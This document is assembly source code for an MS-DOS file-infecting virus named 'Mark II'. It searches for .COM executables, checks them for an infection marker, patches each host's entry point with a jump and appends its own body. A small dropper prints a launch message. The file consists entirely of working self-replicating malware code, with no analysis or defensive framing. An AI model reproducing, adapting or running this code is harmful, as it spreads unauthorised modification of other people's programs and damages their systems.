PAGE,120

_VIRUS SEGMENT
ASSUME cs:_VIRUS,ds:_VIRUS,ss:_VIRUS

ORG 100h

filelength EQU begin-start
start:  db 0E9h
    dw filelength+4-3
    mov cx,lmessage
    mov dx, OFFSET message
    mov ah, 40h
    int 21h
    mov ah,4Ch
    int 21h

message: db "Mark II virus launched successfully.",0Dh,0Ah,0
lmessage EQU $-message

virlength EQU finish-begin+102h

begin:  db 0BBh,01,00
    db 00

virusbegin: mov bp,101h
        mov bx, WORD PTR [bp]
        add bx,103h
        mov bp,100h
        mov dl,[bx-4]
        mov [bp],dl
        mov dl,[bx-3]
        mov [bp+1],dl
        mov dl,[bx-2]
        mov [bp+2],dl
        push bx

        jmp sfirst

wildcard:   db "*.COM",0

sfirst: mov ah,4Eh
    pop dx
    push dx
    add dx,wildcard-virusbegin
    mov cx,0
    int 21h
    jnc over1
    jmp payload

over1:  mov bx,80h+1Ah
    mov ax,virlength
    add ax,[bx]
    jno checkinfect
    jmp snext

checkinfect:

fileopen:   mov ah,3Dh
        mov al,02
        mov dx,80h+1Eh
        int 21h
        jnc opened
        jmp snext

opened: push ax
    mov ah,42h
    mov al,02
    pop bx
    push bx
    mov cx,0FFFFh
    mov dx,0FFFCh
    int 21h
    jnc over3
    jmp closefile

over3:  mov ah,3Fh
    pop bx
    pop dx
    push dx
    push bx
    add dx,-4
    mov cx,4
    int 21h
    jnc over4
    jmp closefile

over4:  pop bx
    pop bp
    push bp
    push bx
    mov bh,[bp-4]
    mov bl,[bp-3]
    xor bx,0001h
    jnz over5
over4a: mov bh,[bp-2]
    mov bl,[bp-1]
    xor bx,0FFE0h
    jnz over5
    jmp closefile

over5:  mov ah,42h
    pop bx
    push bx
    mov al,00
    mov cx,0
    mov dx,0
    int 21h
    jnc over6
    jmp closefile

over6:  mov ah,3Fh
    pop bx
    pop dx
    push dx
    push bx
    add dx,-4
    mov cx,3
    int 21h
    mov al,0
    add dx,3
    mov bp,dx
    mov [bp],al
    mov ah,42h
    pop bx
    push bx
    mov al,00
    mov cx,0
    mov dx,0
    int 21h
    jnc past
    jmp closefile

tempbuf:    db 0E9h,0,0

past:   pop bx
    pop bp
    push bp
    push bx
    mov si,80h+1Ah
    mov ax,[si]
    xchg ah,al
    sahf
    xchg ah,al
    jnc noadd
    add ax,1

noadd:  add ax,1
    add bp,tempbuf-virusbegin
    mov [bp+1],al
    mov [bp+2],ah
    mov dx,bp
    mov ah,40h
    mov cx,3
    int 21h
    mov ah,42h
    mov al,02
    mov cx,0
    mov dx,0
    pop bx
    push bx
    int 21h
    mov bp,80h+1Ah
    mov ax,[bp]
    and ax,1
    jz skip
    mov ah,40h
    pop bx
    pop bp
    push bp
    push bx
    add bp,-1
    mov dx,bp
    mov cx,1
    mov [bp],ch
    int 21h

skip:   mov ah,40h
    mov cx,finish-begin
    pop bx
    pop dx
    push dx
    push bx
    add dx,-4
    int 21h
    pop bx
    mov ah,3Eh
    int 21h
    jmp payload

closefile:  pop bx
        mov ah,3Eh
        int 21h

snext:  mov ah,4Fh
    int 21h
    jc payload
    jmp fileopen

payload:    nop

        pop bp
        mov ax,100h
        jmp ax

finish:

_VIRUS ENDS
END start
